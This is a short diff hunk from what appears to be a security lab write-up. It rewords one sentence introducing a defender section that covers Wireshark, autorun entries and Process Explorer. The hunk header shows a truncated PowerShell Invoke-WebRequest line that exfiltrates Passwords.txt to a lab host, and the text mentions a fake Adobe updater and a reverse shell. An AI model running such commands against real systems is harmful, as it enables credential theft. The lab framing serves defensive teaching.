@@ -144,7 +144,7 @@ powershell -c "Invoke-WebRequest -Uri http://192.168.78.129:8080/Passwords.txt -
 
 Now that we’ve followed the attacker’s full playbook — from clicking the fake Adobe updater to catching a reverse shell and exfiltrating `Passwords.txt` — let’s switch gears and step into the defender’s shoes.
 
-This next section walks through how security analysts can spot and respond to this kind of behavior using network traffic analysis, autorun entries, and process inspection tools.
+This next section walks through how security analysts can spot and respond to this kind of behavior using network traffic analysis tools like Wireshark, autorun entries, and Process Explorer.
 
 ---
 
